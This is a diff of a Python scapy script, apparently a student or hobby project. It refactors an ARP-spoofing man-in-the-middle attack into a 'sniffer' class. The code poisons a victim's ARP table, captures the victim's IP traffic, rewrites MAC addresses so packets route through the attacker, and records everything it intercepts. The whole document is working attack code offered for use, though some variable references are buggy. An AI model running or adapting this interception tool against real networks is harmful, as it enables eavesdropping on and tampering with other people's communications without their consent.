@@ -1,3 +1,5 @@
+from time import sleep
+
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 import threading
@@ -27,87 +29,53 @@ interceptedPkt = []
 # - performe that request and receive response from dst ip
 # - and then send that resposne to the victim ip
 
-def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
+class sniffer():
+    def __init__(self, networkInterface, victimIP, spoofIP, attackerMAC):
+        self.networkInterface = networkInterface
+        self.victimIP = victimIP
+        self.spoofIP = spoofIP
+        self.attackerMAC = attackerMAC
+        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
+        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
+        self.interceptedPkt = []
 
-    #lock threade to fill in arrays
-    lock.acquire()
-    victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
-    serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP] # get array of MAC of poisoned ips in victim arp table
-    lock.release()
+    def startSniff(self):
+        sniff(prn=self.intercept, iface=networkInterface, filter="ip", timeout = 20)
 
-    #filter to catch up only packets with TCP layer, distintaion to attacker MAC AND
-    # with dist IP in the list of poisoned IP in victin arp table  OR
-    # distination IP is victiM IP
-    # input : intercepted packet
-    def snifFilter(pkt):
-        # lock thread
-        lock.acquire()
-        print("I got here *")
-        print(spoofIP, victimIP)
-        print(pkt.haslayer(TCP), pkt[Ether].dst == attackerMAC, pkt[IP].dst)
-        print(pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP))
-        lock.release()
-        if (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP)):
-            return True
-        else :
-            return False
-
-
-    #input: intercepted packet
-    # output : send response paket to the network
-    def intercept(pkt):
+    def intercept(self, pkt):
 
         #update intercepted packet list
-        interceptedPkt.append(pkt)
+        self.interceptedPkt.append(pkt)
 
-        #lock thread
-        lock.acquire()
         #print("I got here")
         #case 1: victim request an IP which has as destination MAC of attacker
         # find corresponding MAC to that IP in array of spoffed IPs and
         # put as destination to the new packet
-        if pkt[Ether].dst == attackerMAC :
+        print(pkt.show())
+        if pkt[Ether].dst == self.attackerMAC :
             if pkt[IP].dst in  spoofIP:
-                pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
+                pkt[Ether].dst = self.serverMAC[spoofIP.index(pkt[IP].dst)]
             else:
             #case 2: server response for the request of the victim
             #so replace destination MAC to the MAC of victim
-                pkt[Ether].dst = victimMAC
+                pkt[Ether].dst = self.victimMAC
 
             #put src to attackerMAC as both arp tables of server and victim
             #maintain requested IP andresses under attacker MAC
-            pkt[Ether].src = attackerMAC
+            pkt[Ether].src = self.attackerMAC
 
             # send packet to the network
             sendp(pkt, iface=networkInterface)
             print(pkt.show())
-        lock.release()
 
+    def spoof(self):
+        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)
 
-    #contineously sniff for the arp packet in network with before defined filter
-    #on each intercepted packet perform intercep method
-    sniff(prn=intercept, iface=networkInterface, filter="ip")
+    def start(self):
+        while (True):
+            test.spoof()
+            test.startSniff()
 
-# input :
-# - target ip of device for poisoning arp table as array of str
-# - target array of ip for spoofing as aray of str
-# - network interface as str
-# output ;
-# - creates two threades
-# - first thread poisoning arp table of target ip
-# - second thread is performing forwarding of packets (MIMA)
-def arp(victimIP, spoofIP, networkInterface):
-    poisonThread = threading.Thread(target=arpSpoof.arpPoisoning(victimIP, spoofIP, networkInterface))
-    poisonThread.daemon = True
-    poisonThread.start()
+test = sniffer(networkInterface, [victimIP], [spoofIP], get_if_hwaddr(networkInterface))
 
-    sniffThread = threading.Thread(target = arpSniffing(get_if_hwaddr(networkInterface), victimIP, spoofIP, networkInterface))
-    sniffThread.daemon = True
-    sniffThread.start()
-
-#main method for executin forward attack
-def main(victimIP, spoofIP, networkInterface):
-    arp(victimIP, spoofIP, networkInterface)
-
-
-main([victimIP],[spoofIP], networkInterface)
+test.start()
